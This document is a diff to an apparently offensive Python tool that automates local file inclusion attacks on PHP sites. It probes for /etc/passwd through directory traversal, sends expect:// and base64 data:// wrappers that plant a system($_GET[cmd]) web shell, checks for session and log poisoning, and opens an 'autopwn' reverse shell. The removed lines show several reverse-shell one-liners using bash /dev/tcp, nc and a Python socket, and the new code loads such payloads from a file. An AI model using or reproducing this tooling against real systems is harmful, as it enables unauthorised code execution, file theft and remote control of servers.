@@ -11,11 +11,11 @@ from requests.auth import HTTPBasicAuth
 from pwn import listen
 import threading
 import time
-
+import pathlib
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
@@ -33,7 +33,7 @@ class Payload:
 		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
 		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]
 
-		# PHPSESSID Cooki
+		# PHPSESSID Cookie
 		self.cookiePath = "/var/lib/php/sessions/sess_"
 
 		# payload for RCE
@@ -41,7 +41,7 @@ class Payload:
 
 		self.proxies = proxies
 		if initiate:
-			self.Attack(attempt_shell)
+			self.Attack(attempt_shell, mode)
 
 
 
@@ -53,7 +53,7 @@ class Payload:
 
 
 
-	def Attack(self, attempt_shell=False):
+	def Attack(self, attempt_shell=False, mode=0):
 		if self.urlCheck():
 			self.dirTraversalCheck()
 			headerres = self.headerCheck()
@@ -62,16 +62,18 @@ class Payload:
 			logres = self.logPoisonCheck()
 
 		if attempt_shell:
-			self.autopwn(attempt_shell, cookieres, headerres, logres)
+			self.autopwn(attempt_shell, cookieres, headerres, logres, mode)
 
 
 
-	def autopwn(self, attempt_shell, cookieres, headerres, logres):
-		#payload = f"bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
-		#payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attempt_shell} 1337 >/tmp/f"
-		#payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attempt_shell}",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
-		payload = "nc {ip} 1337 -e /bin/bash"
-		payload = payload.replace('{ip}', attempt_shell)
+	def autopwn(self, attempt_shell, cookieres, headerres, logres, mode=0):
+		cwd = pathlib.Path().resolve()
+		with open(str(cwd) + "/misc.txt") as handle:
+			payloads = handle.read()
+			payloads = payloads.split('\n')
+		payload = payloads[mode]
+
+		payload = payload.replace('{ip}', attempt_shell).replace('{port}','1337')
 		if cookieres or headerres or logres == False:
 			print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
 			return
